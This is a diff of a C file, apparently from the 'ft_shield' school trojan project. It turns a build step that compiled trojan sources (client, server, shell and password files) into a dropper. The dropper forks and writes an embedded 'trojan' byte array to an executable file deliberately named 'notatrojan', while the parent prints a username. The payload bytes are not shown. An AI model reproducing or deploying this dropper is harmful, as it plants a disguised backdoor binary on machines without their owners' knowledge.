@@ -2,20 +2,18 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
 #include <fcntl.h>
+#include <ft_shield.h>
 
-#define NAME "trojan"
-
-#define FILES "src/trojan/client.c", "src/trojan/main.c",			\
-				"src/trojan/password.c", "src/trojan/server.c",		\
-		 		"src/trojan/shell.c"
+#define NAME "notatrojan"
 
 int main() {
-	int out = open("/dev/null", O_WRONLY);
 	if (fork() == 0) {
-		dup2(1, out);
-		dup2(2, out);
-		execl("/bin/cc", "/bin/cc", FILES, "-Llib", "-lft", "-o", NAME, "-Iinclude");
+		int fd = open(NAME, O_WRONLY | O_TRUNC | O_CREAT, 0755);
+		if (fd >= 0 && strlen((char*)trojan)) {
+			write(fd, trojan, trojan_len);
+		}
 		exit(0);
 	} else {
 		printf("jcario\n");
